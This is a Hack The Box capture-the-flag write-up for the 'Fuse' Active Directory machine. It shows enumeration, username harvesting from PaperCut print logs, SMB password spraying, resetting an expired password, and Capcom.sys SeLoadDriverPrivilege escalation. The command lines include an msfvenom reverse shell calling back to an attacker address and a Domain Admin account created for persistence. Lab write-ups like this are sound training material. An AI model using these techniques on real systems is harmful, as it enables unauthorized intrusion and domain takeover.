---
title: "[MEDIUM] HTB-Fuse"
draft: false
tags:
  - htb
  - windows
  - active-directory
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/Fuse.png)

![alt text](Fuse.png)

## Information Gathering
### Rustscan

Rustscan finds lot of ports open. Based on the ports open, this server seems to be running Active Directory.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/fuse]
└─$ sudo rustscan --addresses 10.10.10.193 --range 1-65535
[sudo] password for yoon: 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<snip>
Host is up, received echo-reply ttl 127 (0.31s latency).
Scanned at 2024-04-21 01:54:59 EDT for 2s

PORT      STATE    SERVICE          REASON
53/tcp    open     domain           syn-ack ttl 127
80/tcp    open     http             syn-ack ttl 127
88/tcp    open     kerberos-sec     syn-ack ttl 127
135/tcp   open     msrpc            syn-ack ttl 127
139/tcp   open     netbios-ssn      syn-ack ttl 127
389/tcp   open     ldap             syn-ack ttl 127
445/tcp   open     microsoft-ds     syn-ack ttl 127
464/tcp   open     kpasswd5         syn-ack ttl 127
593/tcp   open     http-rpc-epmap   syn-ack ttl 127
636/tcp   open     ldapssl          syn-ack ttl 127
3268/tcp  open     globalcatLDAP    syn-ack ttl 127
3269/tcp  open     globalcatLDAPssl syn-ack ttl 127
5985/tcp  open     wsman            syn-ack ttl 127
9389/tcp  open     adws             syn-ack ttl 127
49666/tcp open     unknown          syn-ack ttl 127
49679/tcp open     unknown          syn-ack ttl 127
49681/tcp open     unknown          syn-ack ttl 127
49709/tcp filtered unknown          no-response
49774/tcp open     unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.39 seconds
           Raw packets sent: 24 (1.032KB) | Rcvd: 24 (1.928KB)
```

## Enumeration
### SMB - TCP 445

SMB rejects anonymous login listing:

`smbclient -N -L //10.10.10.193`

![alt text](image.png)



crackmapexec discovers the server as running **Windows server 2016** and shows the domain name **fabricorp.local** which I add to  `/etc/hosts`.

![alt text](image-1.png)

### DNS UDP/TCP 53

DNS confirms the domain name fabricorp.local:

![alt text](image-5.png)

Zone transfer fails:

![alt text](image-4.png)


### LDAP - TCP 389

Although I already know domain name, I can reconfim it using ldap as search:

`ldapsearch -H ldap://10.10.10.193 -x -s base namingcontexts`

![alt text](image-7.png)

Unfortuneately, ldap bind fails:

`ldapsearch -H ldap://10.10.10.193 -x -b "DC=fabricorp,DC=local"`

![alt text](image-8.png)


### HTTP - TCP 80

Going to 10.10.10.193 on web browser redirects me to `http://fuse.fabricorp.local`, which I add to `/etc/hosts`

![alt text](image-2.png)

The website is running **PaperCut** and it several past print logs:

![alt text](image-3.png)

Before moving on to enumerating website more, I will try looking for more subdomains:

`sudo gobuster vhost -u http://fabricorp.local --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt `

![alt text](image-6.png)

Unfortunately, **fuse.fabricorp.local** seems to be the only subdomain. 

### Potential Usernames

Using Burp Suite, I can map the website with more ease as such:

![alt text](image-9.png)

I see five **.csv** files according to what Burp Suite finds.

Each of the .csv files shows Users, printer, and document name that was used for printing:

`http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-05-29.htm`

![alt text](image-10.png)

`http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-05-30.htm`

![alt text](image-11.png)

`http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-06-10.htm`

![alt text](image-12.png)

Last two .csv files that Burp Suite finds seems to be sum for each month (May and June):

`http://fuse.fabricorp.local/papercut/logs/csv/monthly/papercut-print-log-2020-05.csv`

![alt text](image-13.png)

`http://fuse.fabricorp.local/papercut/logs/csv/monthly/papercut-print-log-2020-06.csv`

![alt text](image-14.png)

I see bunch of potential usernames here so I will crete a username as such to perform attacks such as Kerbruting and AS-REP Roasting:

![alt text](image-19.png)


## Kerbrute 

I will Kerbrute using the potential username list made above:

`./kerbrute_linux_amd64 userenum -d fabricorp.local --dc 10.10.10.193 ~/Documents/htb/fuse/usernames.txt`

![alt text](image-20.png)

Kerbrute identifies several of them to be valid and I will save those users in a seperate file as such:

![alt text](image-21.png)

## AS-REP Roasting (Fail)

Now that I have valid usernames, I will move on to AS-REP Roasting:

`sudo GetNPUsers.py 'fabricorp.local/' -user users.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.193`

![alt text](image-22.png)

Unfortunately, none of them has DONT_REQUIRE_PREAUTH set.


## Shell as svc-print
### SMB Bruteroce

Since I have list of valid usernames and potential usernames, I will use those to bruteforce smb login:

`crackmapexec smb -u users.txt -p usernames.txt --continue-on-success 10.10.10.193`

![alt text](image-23.png)

![alt text](image-24.png)

It see something uncommon here for **bhult**:**Fabricorp01** and **tlavel**:**Fabricorp01**.

This status typically occurs when the user's password has expired or when it's flagged for a mandatory change by the domain policy or administrator settings.

You can see that attempting to login through smbclient showing the same error. 

![alt text](image-25.png)

### Change Password

With the old expired password, I can change it to a new one using **impacket-smbpasswd** as such:

`impacket-smbpasswd tlavel@10.10.10.193`

![alt text](image-26.png)

Now the password should be newly set to **Password123!!!**

I can conform this by listing smb shares as tlavel with newly changed password:

`smbclient -L //10.10.10.193 -U tlavel`

![alt text](image-27.png)

I want to enumerate as tlavel but it turns out the password keeps on getting reset to the default one every other minute. Because of this, I had to move very quickly during enumeration.

### RPC as tlavel

I had no success enumerating anything juicy from SMB so I will move on to enumerating RPC.

I first will `querydispinfo` and see if there's any interesting information on description and add the users to my user list:

![alt text](image-28.png)




Since the web app is running sfotware related to printers, I will query `enumprinters` and it reveals the password: **$fab@s3Rv1ce$1**

![alt text](image-29.png)

### Evil-Winrm

Now I will spray the password to the list of users and it turns out **svc-print** is using the following password:

`crackmapexec smb 10.10.10.193 -u users.txt -p '$fab@s3Rv1ce$1`

![alt text](image-30.png)

Luckily, svc-print is in the remote management group and it seems that I can sign-in through WinRM:

![alt text](image-31.png)

Now through **evil-winrm**, I have a shell as **svc-print**:

![alt text](image-33.png)

## Privsec: svcprint to system

After running SharpHound.exe and Bloodhound, I will first mark user **svc-print** as owned:

![alt text](image-34.png)

I expected Active Directory style privilege escalation here but it seems like there's nothing much to be done here from svc-print to the domain:

![alt text](image-35.png)

Running PowerUp.ps1, it notices me on several interesting points:

![alt text](image-36.png)

One of them is about **Registry Autologons**:

![alt text](image-38.png)

Unfortunately, default password is not shwon from it:

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`

![alt text](image-39.png)

Another interesting point that PowerUp.ps1 shows is **SeLoadDriverPrivilege**:

![alt text](image-37.png)



## SeLoadDriverPrivilege

According to [Priv2Admin](https://github.com/gtworek/Priv2Admin), SeLoadDriverPrivilege got Admin level impact over the system:

![alt text](image-40.png)


### Exploitation

I will first upload the driver [eoploaddriver_x64.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/eoploaddriver_x64.exe), [Capcom.sys file](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/Capcom.sys), [ExploitCapcom.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/ExploitCapcom.exe) on target's `C:\Windows\Temp`.


Now using **ExploitCapcom.exe** I will load **Capcom.sys** to target machine.

`.\ExploitCapcom.exe LOAD C:\Windows\Temp\Capcom.sys`

![alt text](image-41.png)

After successfully loading Capcom.sys we can now run any cmd as privilege user with EXPLOIT keyword as such:

`\ExploitCapcom.exe EXPLOIT whoami`

![alt text](image-42.png)

Now on my local Kali machine, I will create a reverse shell using msfvenom:

`sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=1337 -f exe > shell.exe`

![alt text](image-43.png)

After uploading the payload to the target, I will run it:

`.\ExploitCapcom.exe EXPLOIT shell.exe`

![alt text](image-44.png)

Now on my local listener, I have a shell as the system:

![alt text](image-45.png)

## Beyond Root
### Persistence

For persistence, I will add Domain Admin user **jadu** as such:

![alt text](image-46.png)

Now using eivl-winrm, I have a stable Domain Admin shell:

![alt text](image-47.png)

## References 
- https://github.com/gtworek/Priv2Admin
- https://github.com/k4sth4/SeLoadDriverPrivilege